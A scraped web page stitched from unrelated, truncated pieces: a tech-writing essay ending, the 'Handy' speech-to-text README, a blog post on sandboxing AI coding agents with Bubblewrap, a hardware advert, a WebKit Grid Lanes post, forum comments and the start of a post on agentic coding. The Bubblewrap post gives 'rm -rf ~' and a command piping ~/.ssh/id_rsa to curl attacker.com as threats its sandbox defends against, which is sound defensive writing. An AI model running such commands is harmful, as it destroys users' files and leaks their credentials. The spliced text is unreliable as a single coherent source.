<p>Productivity gains are real when you understand that augmentation is better than replacing humans, a reality even AWS’ CEO, Matt Garman, <a href="https://www.theregister.com/2025/08/21/aws_ceo_entry_level_jobs_opinion/">acknowledged</a>. Read <a href="https://passo.uno/ai-tech-writer-examples/">how I’m using AI</a> as a technical writer. I’m not alone: Follow <a href="https://idratherbewriting.com/">Tom Johnson</a>, <a href="https://docsgoblin.com/">CT Smith</a>, and <a href="https://sdeaton.com/">Sarah Deaton</a>, and discover how tech writers are building tools through AI to better apply it to docs.</p>
<p>Develop an <a href="https://thisisimportant.net/posts/ai-strategy-for-documentation/">AI strategy for docs</a> together with tech writers, and give them time and resources to experiment with AI. Tech writers are resourceful by nature: they’ve spent careers doing more with less, optimizing workflows, finding clever solutions to impossible quests. Give them the tools and a bit of runway, and they’ll figure out how to make AI work for the docs, not instead of them.</p>
<h2 id="so-heres-my-request-for-you-reconsider">So here’s my request for you: Reconsider</h2>
<p>Reconsider the positions you did not open. Or the writers you let go. Reconsider the assumption that AI has solved a problem that, at its core, is deeply human and requires not only concatenating words, but also chasing subject-matter experts and understanding the subtleties of product motions, among many other things.</p>
<p>Technical writers aren’t a luxury. They are the people who translate what you’ve built into something others can use. Without them, you’re shipping a product that can’t speak for itself, or that lies. Your product needs to speak. AI can generate noise effectively and infinitely, but only a technical writer can create the signal.</p>
<p>Don’t choose the noise. Get them back. Get them onboard.</p>

<p dir="auto"><strong>A free, open source, and extensible speech-to-text application that works completely offline.</strong></p>
<p dir="auto">Handy is a cross-platform desktop application built with Tauri (Rust + React/TypeScript) that provides simple, privacy-focused speech transcription. Press a shortcut, speak, and have your words appear in any text field—all without sending your voice to the cloud.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Why Handy?</h2><a id="user-content-why-handy" aria-label="Permalink: Why Handy?" href="#why-handy"></a></p>
<p dir="auto">Handy was created to fill the gap for a truly open source, extensible speech-to-text tool. As stated on <a href="https://handy.computer/" rel="nofollow">handy.computer</a>:</p>
<ul dir="auto">
<li><strong>Free</strong>: Accessibility tooling belongs in everyone's hands, not behind a paywall</li>
<li><strong>Open Source</strong>: Together we can build further. Extend Handy for yourself and contribute to something bigger</li>
<li><strong>Private</strong>: Your voice stays on your computer. Get transcriptions without sending audio to the cloud</li>
<li><strong>Simple</strong>: One tool, one job. Transcribe what you say and put it into a text box</li>
</ul>
<p dir="auto">Handy isn't trying to be the best speech-to-text app—it's trying to be the most forkable one.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">How It Works</h2><a id="user-content-how-it-works" aria-label="Permalink: How It Works" href="#how-it-works"></a></p>
<ol dir="auto">
<li><strong>Press</strong> a configurable keyboard shortcut to start/stop recording (or use push-to-talk mode)</li>
<li><strong>Speak</strong> your words while the shortcut is active</li>
<li><strong>Release</strong> and Handy processes your speech using Whisper</li>
<li><strong>Get</strong> your transcribed text pasted directly into whatever app you're using</li>
</ol>
<p dir="auto">The process is entirely local:</p>
<ul dir="auto">
<li>Silence is filtered using VAD (Voice Activity Detection) with Silero</li>
<li>Transcription uses your choice of models:
<ul dir="auto">
<li><strong>Whisper models</strong> (Small/Medium/Turbo/Large) with GPU acceleration when available</li>
<li><strong>Parakeet V3</strong> - CPU-optimized model with excellent performance and automatic language detection</li>
</ul>
</li>
<li>Works on Windows, macOS, and Linux</li>
</ul>

<li><strong>Backend</strong>: Rust for system integration, audio processing, and ML inference</li>
<li><strong>Core Libraries</strong>:
<ul dir="auto">
<li><code>whisper-rs</code>: Local speech recognition with Whisper models</li>
<li><code>transcription-rs</code>: CPU-optimized speech recognition with Parakeet models</li>
<li><code>cpal</code>: Cross-platform audio I/O</li>
<li><code>vad-rs</code>: Voice Activity Detection</li>
<li><code>rdev</code>: Global keyboard shortcuts and system events</li>
<li><code>rubato</code>: Audio resampling</li>
</ul>
</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Debug Mode</h3><a id="user-content-debug-mode" aria-label="Permalink: Debug Mode" href="#debug-mode"></a></p>
<p dir="auto">Handy includes an advanced debug mode for development and troubleshooting. Access it by pressing:</p>

<p dir="auto">This project is actively being developed and has some <a href="https://github.com/cjpais/Handy/issues">known issues</a>. We believe in transparency about the current state:</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Major Issues (Help Wanted)</h3><a id="user-content-major-issues-help-wanted" aria-label="Permalink: Major Issues (Help Wanted)" href="#major-issues-help-wanted"></a></p>
<p dir="auto"><strong>Whisper Model Crashes:</strong></p>
<ul dir="auto">
<li>Whisper models crash on certain system configurations (Windows and Linux)</li>
<li>Does not affect all systems - issue is configuration-dependent
<ul dir="auto">
<li>If you experience crashes and are a developer, please help to fix and provide debug logs!</li>
</ul>
</li>
</ul>
<p dir="auto"><strong>Wayland Support (Linux):</strong></p>
<ul dir="auto">
<li>Limited support for Wayland display server</li>
<li>Requires <a href="https://github.com/atx/wtype"><code>wtype</code></a> or <a href="https://sr.ht/~geb/dotool/" rel="nofollow"><code>dotool</code></a> for text input to work correctly (see <a href="#linux-notes">Linux Notes</a> below for installation)</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Linux Notes</h3><a id="user-content-linux-notes" aria-label="Permalink: Linux Notes" href="#linux-notes"></a></p>
<p dir="auto"><strong>Text Input Tools:</strong></p>
<p dir="auto">For reliable text input on Linux, install the appropriate tool for your display server:</p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Display Server</th>
<th>Recommended Tool</th>
<th>Install Command</th>
</tr>
</thead>
<tbody>
<tr>
<td>X11</td>
<td><code>xdotool</code></td>
<td><code>sudo apt install xdotool</code></td>
</tr>
<tr>
<td>Wayland</td>
<td><code>wtype</code></td>
<td><code>sudo apt install wtype</code></td>
</tr>
<tr>
<td>Both</td>
<td><code>dotool</code></td>
<td><code>sudo apt install dotool</code> (requires <code>input</code> group)</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<ul dir="auto">
<li><strong>X11</strong>: Install <code>xdotool</code> for both direct typing and clipboard paste shortcuts</li>
<li><strong>Wayland</strong>: Install <code>wtype</code> (preferred) or <code>dotool</code> for text input to work correctly</li>
<li><strong>dotool setup</strong>: Requires adding your user to the <code>input</code> group: <code>sudo usermod -aG input $USER</code> (then log out and back in)</li>
</ul>
<p dir="auto">Without these tools, Handy falls back to enigo which may have limited compatibility, especially on Wayland.</p>
<p dir="auto"><strong>Other Notes:</strong></p>
<ul dir="auto">
<li>
<p dir="auto">The recording overlay is disabled by default on Linux (<code>Overlay Position: None</code>) because certain compositors treat it as the active window. When the overlay is visible it can steal focus, which prevents Handy from pasting back into the application that triggered transcription. If you enable the overlay anyway, be aware that clipboard-based pasting might fail or end up in the wrong window.</p>
</li>
<li>
<p dir="auto">If you are having trouble with the app, running with the environment variable <code>WEBKIT_DISABLE_DMABUF_RENDERER=1</code> may help</p>
</li>
<li>
<p dir="auto">You can manage global shortcuts outside of Handy and still control the app via signals. Sending <code>SIGUSR2</code> to the Handy process toggles recording on/off, which lets Wayland window managers or other hotkey daemons keep ownership of keybindings. Example (Sway):</p>
<div dir="auto" data-snippet-clipboard-copy-content="bindsym $mod+o exec pkill -USR2 -n handy"><pre>bindsym $mod+o exec pkill -USR2 -n handy</pre></div>
<p dir="auto"><code>pkill</code> here simply delivers the signal—it does not terminate the process.</p>
</li>

<p>Last week I wrote&nbsp;<a href="https://patrickmccanna.net/keeping-secrets-from-claude-code/">a thing</a>&nbsp;about how to run Claude Code when you don’t trust Claude Code. I proposed the creation of a dedicated user account &amp; standard unix access controls. The objective was to stop Claude from dancing through your .env files, eating your secrets. There are some usability problems with that guide- I found a better approach and I wanted to share.</p>



<p><strong>TL;DR:</strong>&nbsp;Use Bubblewrap to sandbox Claude Code (and other AI agents) without trusting anyone’s implementation but your own. It’s simpler than Docker and more secure than a dedicated user account.  Bubblewrap delivers a sweet spot combination of control AND flexibility that enables experimentation.</p>



<h2>What Changed Since My Last Post</h2>



<p>Immediately after publishing, I caught the flu. During three painful days in bed, I realized there are other better approaches.&nbsp;<a href="https://wiki.archlinux.org/title/Firejail">Firejail</a>&nbsp;would likely work well- but also there’s another solution called&nbsp;<a href="https://wiki.archlinux.org/title/Bubblewrap">Bubblewrap</a>.</p>



<p>As I dug into Bubblewrap, I realized something else… <a href="https://code.claude.com/docs/en/sandboxing">Anthropic uses Bubblewrap</a>!</p>



<p>But Anthropic embeds bubblewrap in their client. This implementation has a major disadvantage.</p>



<p>Embedding bubblewrap in the client means you have to trust the correctness and security of Anthropic’s implementation. They deserve credit for thinking about security, but this puzzles me. Why not publish guidance so users can secure themselves from Claude Code? Aren’t we going to need this for ALL agents? Isn’t this solution generalizable?</p>



<p>Defense-in-depth means we don’t rely on any single vendor to execute perfectly 100% of the time. Plus, this problem applies to all coding agents, not just Claude Code. I want an approach that doesn’t tie my security to Anthropic’s destiny.</p>



<h2>The Security Problem We’re Solving</h2>



<p>Before we dive into Bubblewrap, here’s what we’re protecting against:</p>



<ul>
<li>You want to run a binary that will execute under your account’s permissions</li>



<li>Your account has access to sensitive files unrelated to the project you’re working on</li>



<li>You want your binary to invoke other standard system tools like&nbsp;<code>ls</code>,&nbsp;<code>ps -aux</code>, or&nbsp;<code>less</code></li>



<li>We want to invoke this binary while easily preventing it from accessing sensitive files unrelated to binary’s activities</li>
</ul>



<p>What if Claude Code has a bug? What happens if the bug is exploited, and bubblewrap constraints embedded within the client are not activated? Will Claude Code run&nbsp;<code>rm -rf ~</code>&nbsp;or&nbsp;<code>cat ~/.ssh/id_rsa | curl attacker.com</code>?</p>



<p>Without your own wrapping of the agent, you’re at risk. When you wrap your coding agent calls with Bubblewrap, the agent’s access to dangerous commands is prevented.</p>



<h2>What Is Bubblewrap?</h2>



<p>Bubblewrap lets you run untrusted or semi-trusted code without risking your host system. We’re not trying to build a reproducible deployment artifact. We’re creating a jail where coding agents can work on your project while being unable to touch&nbsp;&nbsp;<code>~/.aws</code>, your browser profiles, your ~/Photos library or anything else sensitive.</p>



<p>Let’s explore Bubblewrap through the command line:</p>



<pre><code># Install it (Debian/Ubuntu)
sudo apt install bubblewrap

# Simplest possible sandbox - just isolate the filesystem view
bwrap --ro-bind /usr /usr --symlink usr/lib /lib --symlink usr/lib64 /lib64 \
      --symlink usr/bin /bin --proc /proc --dev /dev \
      --unshare-all --die-with-parent \
      /bin/bash

# Inside the sandbox, try:
ls /home          # Empty or nonexistent
ls /etc           # Empty or nonexistent  
whoami            # Shows "nobody" or your mapped user
ping google.com   # Fails - no network
</code></pre>



<h2>How This Command Works</h2>



<p>This command creates a minimal sandboxed environment. Here’s what each part does:</p>



<h3>Filesystem access:</h3>



<ul>
<li><code>--ro-bind /usr /usr</code>&nbsp;mounts your system’s&nbsp;<code>/usr</code>&nbsp;directory as read-only inside the sandbox</li>



<li>The&nbsp;<code>--symlink</code>&nbsp;commands create shortcuts so programs can find libraries and binaries in expected locations</li>



<li><code>--proc /proc</code>&nbsp;and&nbsp;<code>--dev /dev</code>&nbsp;give minimal access to system processes and devices</li>
</ul>



<h3>Isolation:</h3>



<ul>
<li><code>--unshare-all</code>&nbsp;disconnects the sandbox from all system resources (network, shared memory, mount points, etc.)</li>



<li><code>--die-with-parent</code>&nbsp;kills the sandbox if your main terminal closes</li>
</ul>



<h3>The Result:</h3>



<p>Bash runs inside a stripped-down environment. It can execute programs from&nbsp;<code>/usr</code>&nbsp;but can’t see your home directory, config files, or access the network. Programs work, but they’re operating in a ghost town version of your filesystem.</p>



<h2>Why Bubblewrap Beats Docker</h2>



<p>This beats Docker for quick workflows. Docker requires a running daemon and lots of configuration files. Bubblewrap lets you execute your app directly—no daemon, no stale containers cluttering your system.</p>



<p>If you’re experienced enough to worry about Docker misconfigurations, Bubblewrap gives you more control when you need it. You just run a command. No YAML files or debugging background services.</p>



<h2>Quick Start: Running Claude Code with Bubblewrap</h2>



<p>A big part of the reason for needing this, is –dangerously-skip-permissions.  There are times when it’s very useful to give an agent autonomy in desiging, experimenting &amp; implementing systems.  Last week, I built a wifi access point that hosts a Quakeworld Server and vends web assembly quake clients.  It’s an instant-lan party in a box.  I did this unattended and it works.  –dangerously-skip-permissions is very powerful- assuming you know how to aim it safely.  </p>



<p>Here’s how I run Claude Code with&nbsp;<code>--dangerously-skip-permissions</code>&nbsp;inside a Bubblewrap sandbox:</p>



<pre><code>PROJECT_DIR="$HOME/Development/YourProject"
bwrap \
     --ro-bind /usr /usr \
     --ro-bind /lib /lib \
     --ro-bind /lib64 /lib64 \
     --ro-bind /bin /bin \
     --ro-bind /etc/resolv.conf /etc/resolv.conf \
     --ro-bind /etc/hosts /etc/hosts \
     --ro-bind /etc/ssl /etc/ssl \
     --ro-bind /etc/passwd /etc/passwd \
     --ro-bind /etc/group /etc/group \
     --ro-bind "$HOME/.gitconfig" "$HOME/.gitconfig" \
     --ro-bind "$HOME/.nvm" "$HOME/.nvm" \
     --bind "$PROJECT_DIR" "$PROJECT_DIR" \
     --bind "$HOME/.claude" "$HOME/.claude" \
     --tmpfs /tmp \
     --proc /proc \
     --dev /dev \
     --share-net \
     --unshare-pid \
     --die-with-parent \
     --chdir "$PROJECT_DIR" \
     --ro-bind /dev/null "$PROJECT_DIR/.env" \
     --ro-bind /dev/null "$PROJECT_DIR/.env.local" \
     --ro-bind /dev/null "$PROJECT_DIR/.env.production" \
     "$(command -v claude)" --dangerously-skip-permissions "Please review Planning/ReportingEnhancementPlan.md"
</code></pre>



<h3>Key Configuration Lines:</h3>



<pre><code># Required for Claude Code to work
--ro-bind "$HOME/.nvm" "$HOME/.nvm" \

# Claude stores auth here. Without this, you'll re-login every time
--bind "$HOME/.claude" "$HOME/.claude" \

# Only add if you understand why you need SSH access
# --ro-bind "$HOME/.ssh" "$HOME/.ssh" \

# Block access to your .env files by overlaying with empty files (You need to know exact path of files 

     --ro-bind /dev/null "$PROJECT_DIR/.env" \
     --ro-bind /dev/null "$PROJECT_DIR/.env.local" \
     --ro-bind /dev/null "$PROJECT_DIR/.env.production" \
</code></pre>



<p><strong>Important:</strong>&nbsp;Most people don’t need the SSH line. It gives your agent the ability to SSH into systems where you’ve copied a public key. If you don’t understand the utility, don’t add it.</p>



<h2>Why Not a Dedicated User Account?</h2>



<p>My&nbsp;<a href="https://patrickmccanna.net/keeping-secrets-from-claude-code/">previous post</a>&nbsp;proposed creating a custom user account for Claude on the host OS. This approach has three major problems:</p>



<h3>1. ACL Tuning Becomes a Usability Nightmare</h3>



<p>You’ll fight with file permissions constantly. You need to tune Access Control Lists to prevent access to sensitive&nbsp;<code>.env</code>&nbsp;files. This type of friction has killed security initiatives for decades. Security dies on usability hills.</p>



<p>I came up with that approach while getting sick with the flu. Please accept my apologies.</p>



<h3>2. No Network Connectivity Restrictions</h3>



<p>A custom account doesn’t solve the network access problem. Claude agents can spin up sockets and connect to whatever they want. Unless you run UFW and restrict outbound connectivity from your host, you risk your agent exfiltrating content.</p>



<p>I’ve been creating agents that <a href="https://patrickmccanna.net/using-custom-ai-agents-to-migrate-self-hosted-services-between-servers/">remotely administer and tune servers</a>. It’s not responsible to let agents have source:any destination:any access to your network or the Internet. One wrong prompt puts you at risk of data exfiltration. My previous solution was incomplete.</p>



<h3>3. Docker Is the Wrong Tool</h3>



<p>Docker solves the “it works on my machine” problem when moving code from your laptop to production servers. But most people aren’t deploying frequently enough to maintain strong Docker skills.</p>



<p>Setting up filesystems and networking in containers takes mental effort. If you just want to run a command safely, you shouldn’t need to install and configure a background service. People want something that works quickly without the cognitive overhead.</p>



<h2>Why Use Your Own Bubblewrap Instead of Anthropic’s Sandbox?</h2>



<p><strong>Everyone makes security mistakes eventually.</strong>&nbsp;Claude Code is potentially dangerous. Which approach is safer?</p>



<p><strong>Trust Anthropic:</strong>&nbsp;Hope their team never makes an implementation mistake that breaks security controls.</p>



<p>or</p>



<p><strong>Don’t Trust Anthropic:</strong>&nbsp;Implement your own access controls in the operating system that constrain the binary at runtime.</p>



<p>There is one other big reason you should know how to leverage Bubblewrap.   You need a solution for sandboxing agents that aren’t Claude Code.</p>



<p><strong>Agents should never be considered trustworthy.</strong>&nbsp;Even when they have security controls. Put controls around them—don’t rely on agents built with models that have experienced&nbsp;<a href="https://www.anthropic.com/research/agentic-misalignment">misalignment</a>.</p>



<h2>A comparison of what you’re trusting with user-wrapped invocation of bubblewrap versus embedded bubblewrap in a client</h2>



<h3>Running Bubblewrap Yourself:</h3>



<ul>
<li>The Linux kernel’s namespace implementation</li>



<li>The Bubblewrap binary (small, auditable codebase)</li>



<li>Your own configuration (you wrote it, you understand it)</li>



<li>Your own proxy/filtering code</li>
</ul>



<h3>Using Anthropic’s Sandbox Runtime:</h3>



<ul>
<li>Everything above, plus:</li>



<li>Anthropic’s wrapper code and configuration choices</li>



<li>Anthropic’s filtering proxy implementation</li>



<li>Anthropic’s update/distribution mechanism (npm)</li>



<li>That Anthropic’s security interests align with yours</li>
</ul>



<h2>The Trust Matrix</h2>



<p>Trust isn’t binary—it’s about understanding what you’re trusting and why. Here’s a quick comparison:</p>



<figure><table><thead><tr><th data-align="left">Threat</th><th data-align="left">DIY bwrap</th><th data-align="left">Anthropic SRT</th></tr></thead><tbody><tr><td>Claude accidentally&nbsp;<code>rm -rf ~</code></td><td>✓ Protected</td><td>✓ Protected</td></tr><tr><td>Claude exfiltrating ~/.ssh</td><td>✓ Protected</td><td>✓ Protected</td></tr><tr><td>Supply chain attack via npm</td><td>✓ Not exposed</td><td>✗ Exposed</td></tr><tr><td>Subtle misconfiguration</td><td>✗ Your risk</td><td>✓ Their expertise</td></tr><tr><td>Agent Telemetry you don’t want sent</td><td>✓ You control</td><td>? Their choice</td></tr><tr><td>Novel bypass techniques</td><td>✗ You’re on your own</td><td>✓ Their team watches</td></tr></tbody></table></figure>



<p>So in Anthropic’s defense: this is not cut-and-dried. Most companies don’t have resources for great security teams. You have to decide whether you can own this. Many companies will be wise to rely on Anthropic’s expertise. Their reputation is on the line if someone breaks their sandbox implementation. But you’re going to be locked into Anthropic’s security model if you don’t learn how to wield bubblewrap. Pivoting to a new agent will require figuring out security there. Why not just rip the band aid off and learn bubblewrap?</p>



<h2>Don’t trust me either!</h2>



<p>This has been a fun writeup on trusting trust. TRUST ME!</p>



<p>But you shouldn’t trust me! I might be a&nbsp;<a href="https://en.wikipedia.org/wiki/On_the_Internet,_nobody_knows_you%27re_a_dog">Dog on the Internet</a>. Maybe I’m ai slop?!</p>



<p>Here is some code you can use to test the bwrap container I provided for my claude usage. Note that this is invoked different- we’re not going to call claude- we’re going to call bash and pass it the test script.  My test script is available <a href="https://github.com/CaptainMcCrank/BlogCode/blob/main/sandbox-escape-test.sh">here</a>: </p>



<p>All you need to do is create a <strong>YourProject</strong> folder in your <strong>~/$HOME/Development</strong> directory. Then create a <strong>sandbox-escape-test.sh</strong> in there. Fill it with the test code from my github.</p>



<p><strong>Read and understand what the script does before executing it.  </strong>This post is already pretty long 😀</p>



<h2>Wrapping Up</h2>



<p>I’m building with many agents—not just Claude Code. I need a generalized solution for sandboxing that I can apply to other agents.</p>



<p>Anthropic deserves attention and credit for the constraints they’re giving you. I wish they had published them in a way that doesn’t tie your security destiny to their ability to execute correctly 100% of the time.</p>



<p>The choice is yours: trust a vendor’s implementation, or take control of your own security boundaries. Both are valid. I might be paranoid. Are you feeling lucky?</p>



<p>p.s. If I ever get run over by a flaming pizza truck, here’s a handy 1 liner:</p>



<pre><code>claude "Act as a security expert with a specialization in Linux system security.  Help me generate a bubblewrap script for safely invoking coding agents so they do not have access to sensitive data on my file system and appropriately manage other security risks, even though they're going to be invoked under my account's permissions.  Let's talk through everything that the agent should be able to do &amp; access first, and then generate an appropriate bwrap script for delivering that capability.  Then let's discuss what access we should restrict."</code></pre>

	<h2 dir="ltr">Making rapid deployment of advanced AI available to everyone</h2>
<p dir="ltr">With global data center demand at 60 GW in 2024 and <a href="https://www.mckinsey.com/industries/technology-media-and-telecommunications/our-insights/ai-power-expanding-data-center-capacity-to-meet-growing-demand" target="_blank" rel="noreferrer noopener">expected to triple</a> by the end of the decade, the industry faces a once-in-a-generation transformation. More than 80 percent of facilities today are air-cooled and operate at 8 kW per rack or less, making them poorly suited for GPU-based systems that require liquid cooling and 10 kW+ per server.</p>
<p dir="ltr">NXT RNGD Server provides a practical path forward. It allows organizations to deploy advanced AI within their existing facilities, without prohibitive energy costs or disruptive retrofits. Engineered as a plug-and-play system, NXT RNGD combines AI-optimized silicon with Furiosa LLM, a vLLM-compatible serving framework featuring built-in OpenAI API support, enabling organizations to deploy and scale AI workloads from day one. </p>
<p dir="ltr">By combining silicon and system design, NXT RNGD Server makes efficient, enterprise-ready, and future-proof AI infrastructure a reality.</p>

            <div>
                                
                <p>You might have <a href="https://webkit.org/blog/17660/introducing-css-grid-lanes/">heard recently</a> that Safari Technology Preview 234 landed the final plan for supporting masonry-style layouts in CSS. It’s called Grid Lanes.</p>
<figure><picture><source srcset="https://webkit.org/wp-content/uploads/grid-lanes-photos-dark-scaled.webp" type="image/png" media="(prefers-color-scheme: dark)"><img fetchpriority="high" decoding="async" src="https://webkit.org/wp-content/uploads/grid-lanes-photos-light-scaled.webp" alt="web browser showing a 6-column layout of photos of various aspect ratios, packed vertically" width="2560" height="1667" srcset="https://webkit.org/wp-content/uploads/grid-lanes-photos-light-scaled.webp 2560w, https://webkit.org/wp-content/uploads/grid-lanes-photos-light-300x195.webp 300w, https://webkit.org/wp-content/uploads/grid-lanes-photos-light-1024x667.webp 1024w, https://webkit.org/wp-content/uploads/grid-lanes-photos-light-768x500.webp 768w, https://webkit.org/wp-content/uploads/grid-lanes-photos-light-1536x1000.webp 1536w, https://webkit.org/wp-content/uploads/grid-lanes-photos-light-2048x1333.webp 2048w" sizes="(max-width: 2560px) 100vw, 2560px"></picture><figcaption>Try out all <a href="https://webkit.org/demos/grid3/">our demos of CSS Grid Lanes</a> today in Safari Technology Preview.</figcaption></figure>
<p><a href="https://webkit.org/blog/17660/introducing-css-grid-lanes/">CSS Grid Lanes</a> adds a whole new capability to CSS Grid. It lets you line up content in <em>either</em> columns or rows — and not both.</p>
<p>This layout pattern allows content of various aspect ratios to pack together. No longer do you need to truncate content artificially to make it fit. Plus, the content that’s earlier in the HTML gets grouped together towards the start of the container. If new items get lazy loaded, they appear at the end without reshuffling what’s already on screen.</p>
<p>It can be tricky to understand the content flow pattern as you are learning Grid Lanes. The content is not flowing down the first column to the very bottom of the container, and then back up to the top of the second column. (If you want that pattern, use <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Guides/Multicol_layout">CSS Multicolumn</a> or Flexbox.)</p>
<p>With Grid Lanes, the content flows perpendicular to the layout shape you created. When you define columns, the content flows back and forth across those columns, just like to how it would if rows existed. If you define rows, the content will flow up and down through the rows — in the column direction, as if columns were there.</p>
<figure><img decoding="async" src="https://webkit.org/wp-content/uploads/grid-lane-content-flow-scaled.webp" alt="diagram showing how for waterfall layout there are columns, while content flows side to side. And for brick, the content is laid out in rows, while it the order flows up and down." width="2560" height="1439" srcset="https://webkit.org/wp-content/uploads/grid-lane-content-flow-scaled.webp 2560w, https://webkit.org/wp-content/uploads/grid-lane-content-flow-300x169.webp 300w, https://webkit.org/wp-content/uploads/grid-lane-content-flow-1024x575.webp 1024w, https://webkit.org/wp-content/uploads/grid-lane-content-flow-768x432.webp 768w, https://webkit.org/wp-content/uploads/grid-lane-content-flow-1536x863.webp 1536w, https://webkit.org/wp-content/uploads/grid-lane-content-flow-2048x1151.webp 2048w" sizes="(max-width: 2560px) 100vw, 2560px"></figure>
<p>Having a way to see the order of items can make it easier to understand this content flow. Introducing the CSS Grid Lanes Inspector in Safari. It’s just the regular Grid Inspector, now with more features.</p>
<figure><picture><source srcset="https://webkit.org/wp-content/uploads/grid-lanes-order-dark-scaled.webp" type="image/png" media="(prefers-color-scheme: dark)"><img decoding="async" src="https://webkit.org/wp-content/uploads/grid-lanes-order-light-scaled.webp" alt="Grid Lanes photo demo in Safari, with Web Inspector open to the Layout panel, and all the tools for the Grid Inspector turned on. Grid lines are marked with dotted lines. Columns are labeled with numbers and sizes. And each photo is marked with a label like Item 1 — which makes it clear the order of content in the layout." width="2560" height="1667" srcset="https://webkit.org/wp-content/uploads/grid-lanes-order-light-scaled.webp 2560w, https://webkit.org/wp-content/uploads/grid-lanes-order-light-300x195.webp 300w, https://webkit.org/wp-content/uploads/grid-lanes-order-light-1024x667.webp 1024w, https://webkit.org/wp-content/uploads/grid-lanes-order-light-768x500.webp 768w, https://webkit.org/wp-content/uploads/grid-lanes-order-light-1536x1000.webp 1536w, https://webkit.org/wp-content/uploads/grid-lanes-order-light-2048x1333.webp 2048w" sizes="(max-width: 2560px) 100vw, 2560px"></picture></figure>
<p>Safari’s <a href="https://webkit.org/blog/11588/introducing-css-grid-inspector/">Grid Inspector</a> already reveals the grid lines for Grid Lanes, and labels track sizes, line numbers, line names, and area names. Now it has a new feature — “Order Numbers”.</p>
<p>By turning on the order numbers in the example above, we can clearly see how Item 1, 2, 3, and 4 flow across the columns, as if there were a row. Then Item 5 is in the middle right, followed by Item 6 on the far right, and so on.</p>
<p>You might be tempted to believe the content order doesn’t matter. With pages like this photo gallery — most users will have no idea how the photos are ordered in the HTML. But for many users, the content order has a big impact on their experience. You should always consider what it’s like to tab through content — watching one item after another sequentially come into focus. Consider what it’s like to listen to the site through a screenreader while navigating by touch or keyboard. With Grid Lanes, you can adjust <a href="https://webkit.org/blog/17660/introducing-css-grid-lanes/#:~:text=Flow%20Tolerance"><code>flow-tolerance</code></a> to reduce the jumping around and put items where people expect.</p>
<p>To know which value for flow tolerance to choose, it really helps to quickly see the order of items. That makes it immediately clear how your CSS impacts the result.</p>
<p>Order Numbers in the Grid Inspector is an extension of a feature Safari’s Flexbox Inspector has had <a href="https://webkit.org/blog/13152/webkit-features-in-safari-16-0/#:~:text=Safari%2016.0%20adds%20Flexbox%20Inspector.">since Safari 16.0</a> — marking the order of Flex items. Seeing content order is also helpful when using the <code>order</code> property in Flexbox.</p>
<figure><picture><source srcset="https://webkit.org/wp-content/uploads/flexbox-order-dark-scaled.webp" type="image/png" media="(prefers-color-scheme: dark)"><img loading="lazy" decoding="async" src="https://webkit.org/wp-content/uploads/flexbox-order-light-scaled.webp" alt="Web browser showing photo layout —&nbsp;this time a Flexbox layout. The Web Inspector is open to the Layout tab, and the Flexbox Inspector is enabled. The lines of the layout are marked with dotted lines... and each item is labeled with its order. " width="2560" height="1667" srcset="https://webkit.org/wp-content/uploads/flexbox-order-light-scaled.webp 2560w, https://webkit.org/wp-content/uploads/flexbox-order-light-300x195.webp 300w, https://webkit.org/wp-content/uploads/flexbox-order-light-1024x667.webp 1024w, https://webkit.org/wp-content/uploads/flexbox-order-light-768x500.webp 768w, https://webkit.org/wp-content/uploads/flexbox-order-light-1536x1000.webp 1536w, https://webkit.org/wp-content/uploads/flexbox-order-light-2048x1333.webp 2048w" sizes="auto, (max-width: 2560px) 100vw, 2560px"></picture></figure>
<p>Order Numbers in Safari’s Grid Inspector works for CSS Grid and Subgrid, as well as Grid Lanes.</p>
<h3>Try out Safari’s layout tooling</h3>
<p>The Grid and Flexbox layout inspectors might seem similar across browsers, but the team behind Safari’s Web Inspector has taken the time to finely polish the details. In both the Grid and Flexbox Inspectors, you can simultaneously activate as many overlays as you want. No limits. And no janky scrolling due to performance struggles.</p>
<p>Safari’s Flexbox Inspector visually distinguishes between excess free space and Flex gaps, since knowing which is which can solve confusion. It shows the boundaries of items, revealing how they are distributed both on the main axis and the cross axis of Flexbox containers. And it lists all the Flexbox containers, making it easier to understand what’s happening overall.</p>
<p>Our Grid Inspector has a simple and clear interface, making it easy to understand the options. It also lists all Grid containers. And of course, you can change the default colors of the overlays, to best contrast with your site content.</p>
<p>And Safari’s Grid and Flexbox Inspectors are the only browser devtools that label content order. We hope seeing the order of content in Grid Lanes helps you understand it more thoroughly and enjoy using this powerful new layout mechanism.</p>
<h3>Try out Order Numbers</h3>
<p>Order Numbers in Safari’s Grid Inspector shipped today in Safari Technology Preview 235. Let us know what you think. There’s still time to polish the details to make the most helpful tool possible.

<div><p>Not excusing this malicious behavior, but I have to say, the mentioned blog post is a major dick move, too.

<div><p>Blog post author here. Nope, I was just curious, since it's quite remarkable how huge archive.today is, how widely it's used, and how little we know about it. I do acknowledge the irony of an archiver being upset by an archive of their own work though :)</p><p>All that said, the post does not actually dox anyone (as far as I can tell, every name mentioned is an alias or red herring), and the "investigation" was basically punching things into my favorite search engine and seeing what came up. If a nation state level threat actor or even one of the copyright cabals wanted to find the maintainer, they have much better ways of going about it.</p></div></td></tr></tbody></table></td></tr><tr id="46629188"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_46629188" href="https://news.ycombinator.com/vote?id=46629188&amp;how=up&amp;goto=item%3Fid%3D46624740"></a></center></td><td><br>

<p><em>Crafting Interpreters</em> contains everything you need to implement a
full-featured, efficient scripting language. You’ll learn both high-level
concepts around parsing and semantics and gritty details like bytecode
representation and garbage collection. Your brain will light up with new ideas,

<div id="readability-page-1" class="page"><div><p>We've been experimenting with running coding agents autonomously for weeks.</p>
<p>Our goal is to understand how far we can push the frontier of agentic coding for projects that typically take human teams months to complete.</p>
<p>This post describes what we've learned from running hundreds of concurrent agents on a single project, coordinating their work, and watching them write over a million lines of code and trillions of tokens.</p>
<h2 id="the-limits-of-a-single-agent"><a href="#the-limits-of-a-single-agent" aria-label="Link to this section"></a>The limits of a single agent</h2>
<p>Today's agents work well for focused tasks, but are slow for complex projects. The natural next step is to run multiple agents in parallel, but figuring out how to coordinate them is challenging.</p>
